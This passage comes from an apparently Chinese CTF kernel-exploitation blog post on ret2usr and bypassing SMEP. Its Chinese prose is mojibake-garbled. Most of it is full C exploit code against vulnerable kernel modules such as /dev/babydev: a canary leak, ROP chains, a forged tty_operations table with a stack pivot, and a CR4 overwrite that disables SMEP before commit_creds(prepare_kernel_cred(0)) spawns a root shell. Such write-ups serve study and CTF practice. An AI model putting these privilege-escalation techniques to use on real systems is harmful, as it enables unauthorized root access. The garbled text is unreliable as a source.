class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä»½ <code>EXP</code> å…¶å®å¾ˆåƒï¼Œåªæœ‰æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(0))</code> å‡½æ•°çš„éƒ¨åˆ†ä¸ä¸€æ ·ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æœ‰æ„æ€çš„æ˜¯ï¼Œæ— æ³•åœ¨æ­¤å¤„æ‰§è¡Œç”¨æˆ·æ€çš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘è°ƒç”¨äº† <code>puts</code> å‡½æ•°ï¼Œå‘ç°å†…æ ¸å´©æºƒäº†ï¼Œæˆ‘è®¤ä¸ºå…¶åŸå› æ˜¯çŠ¶æ€å¯„å­˜å™¨æ²¡æœ‰è¿›è¡Œåˆ‡æ¢æ‰€å¯¼è‡´çš„ï¼Œå› æ­¤è¿˜å¾—å†å›åˆ°å†…æ ¸ä¸­å»æ¢å¤çŠ¶æ€å¯„å­˜å™¨çš„å€¼ï¼Œæœ€ç»ˆæ‰§è¡Œç”¨æˆ·æ€ä¸­çš„ <code>system(&quot;/bin/sh&quot;)</code> </p><h2 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass-SMEP"></a>bypass-SMEP</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>SMEP</code> å…¨ç§° <code>Supervisor Mode Execution Protection</code> ï¼Œå½“ <code>CPU</code> å¤„äº <code>ring0</code> æ¨¡å¼æ—¶æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ä¼šè§¦å‘é¡µé”™è¯¯ï¼ˆè¯¥é˜²å¾¡æœºåˆ¶ä¼šå°†é¡µè¡¨ä¸­çš„ç”¨æˆ·ç©ºé—´å†…å­˜é¡µæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ <code>ret2user</code>ã€‚åœ¨å¯åŠ¨æ—¶ï¼Œ <code>-cpu</code> é€‰é¡¹ä¸‹åŠ å…¥ <code>+smep</code> å¯ç”¨è¯¥é˜²å¾¡æœºåˆ¶ï¼Œåœ¨ <code>-append</code> é€‰é¡¹ä¸‹åŠ å…¥ <code>nosmep</code> ç¦ç”¨è¯¥æœºåˆ¶ã€‚</p><p>ç³»ç»Ÿä¼šæ ¹æ® <code>CR4</code> å¯„å­˜å™¨ä¸­ç¬¬äºŒåä½çš„å€¼æ¥åˆ¤æ–­ <code>SMEP</code> ä¿æŠ¤æ˜¯å¦å¼€å¯ï¼ˆ <code>1</code> ä¸ºå¼€å¯ï¼Œ<code>0</code> ä¸ºå…³é—­ ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p><p>åœ¨æ‰“å¼€ <code>/dev/ptmx</code> è®¾å¤‡æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ª <code>tty_struct</code> ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å…³æ³¨çš„æ˜¯ <code>const struct tty_operations *ops</code> æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ç»“æ„ä½“ <code>tty_operations</code> ï¼ˆå®šä¹‰å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½åŠ«æŒæ‰ä¸Šé¢çš„æŒ‡é’ˆï¼Œåœ¨å¯¹ <code>/dev/ptmx</code> æ–‡ä»¶è¿›è¡Œ <code>write</code> æˆ–è€… <code>read</code> ç­‰æ“ä½œæ—¶å°±å¯ä»¥è·³è½¬æˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°æŒ‡é’ˆæ‰§è¡Œï¼Œæœ‰ç‚¹ç±»ä¼¼äº <code>FSOP</code> </p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>åœ¨åŠ«æŒçš„ä½ç½®å…ˆè¿›è¡Œç¬¬ä¸€æ¬¡è¿ç§»ï¼Œ<code>rax</code> æ­£å¥½æ˜¯ <code>fake_tty_operation</code> çš„åœ°å€ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬æŠŠæ ˆè½¬ç§»åˆ° <code>fake_tty_operations</code> é‡Œ,æ­¤å¤„æ˜¯å¯ä»¥æ”¾ä¸€å°‘éƒ¨åˆ† <code>gadget</code> ï¼Œç”¨è¿™éƒ¨åˆ†è¿›è¡Œç¬¬äºŒæ¬¡è¿ç§»ï¼Œè¿ç§»åˆ°å †å—ä¸­çš„ <code>rop</code> é“¾ä¸Šï¼Œç”¨ <code>mov cr4,rdi</code> è¿™ä¸ª <code>gadget</code> æ¥æ”¹å˜ <code>cr4</code> å¯„å­˜å™¨çš„å€¼ä»è€Œç»•è¿‡ <code>SMEP</code> ä¿æŠ¤ï¼Œéšåæ‰“ä¸€ä¸ª <code>ret2user</code> å³å¯å®Œæˆææƒã€‚</p><p>æ­¤å¤„çš„ <code>EXP</code> ç”¨çš„æ˜¯ <a href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  å¸ˆå‚…çš„ï¼Œå› ä¸ºè¿™é¢˜å·²ç»åšè¿‡äº†ï¼Œå¹¶ä¸” <code>ha1vk</code> å¸ˆå‚…å†™çš„ä¹Ÿå¾ˆè¯¦ç»†ï¼Œå†å†™ä¸€éä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¤§çš„æ”¹å˜</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_structç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_credså‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;retï¼Œåšæ ˆè¿ç§»ç”¨</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*ä¿å­˜ç”¨æˆ·æ€çš„å¯„å­˜å™¨åˆ°å˜é‡é‡Œ*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//ä¿å­˜ç”¨æˆ·æ€å¯„å­˜å™¨</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//ç”³è¯·ä¸€ä¸ªtty_structå¤§å°çš„å †</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//é‡Šæ”¾è¿™ä¸ªå †</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//è¿™ä¸ªä½ç½®æ˜¯writeå‡½æ•°çš„æŒ‡é’ˆï¼Œç»è¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°å½“è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œraxæ­£å¥½æ˜¯fake_tty_operationçš„åœ°å€ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬æŠŠæ ˆè½¬ç§»åˆ°</span></span><br><span class="line">   <span class="comment">//fake_tty_operationsé‡Œ</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//æ ˆè½¬ç§»åˆ°fake_tty_operationsé‡Œåï¼Œæˆ‘ä»¬ç»§ç»­åšä¸€æ¬¡è½¬ç§»ï¼ŒæŠŠè½¬è½¬ç§»åˆ°æˆ‘ä»¬çš„ropæ•°ç»„é‡Œï¼Œæ‰§è¡ŒROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//è¿™ä¸ªæ“ä½œä¼šç”³è¯·tty_structçš„ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯ä¼šç”³è¯·åˆ°æˆ‘ä»¬ä¹‹å‰é‡Šæ”¾çš„é‚£ä¸ªå †é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fd2æ¥å¯¹å®ƒæ“ä½œ</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//æˆ‘ä»¬å…ˆæŠŠåŸå§‹çš„tty_structå‰é¢çš„æ•°æ®è¯»å‡ºæ¥ï¼Œå­˜å‚¨</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//ä¿®æ”¹const struct tty_operations *ops;æŒ‡é’ˆï¼ŒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//æŠŠç¯¡æ”¹è¿‡çš„tty_structå†™å›å»</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://www.secpulse.com/archives/175110.html">Kernel pwn åŸºç¡€æ•™ç¨‹ä¹‹ ret2usr ä¸ bypass_smep - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47æ¡æ¶ˆæ¯) Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (3)-Bypass-Smep_é’sirçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹ä¼ªé€ tty_structæ‰§è¡Œä»»æ„å‡½æ•°_ha1vkçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (2)-ROP_é’sirçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwnä»å…¥é—¨åˆ°æ”¾å¼ƒ | Ama2in9</a></p><p><a 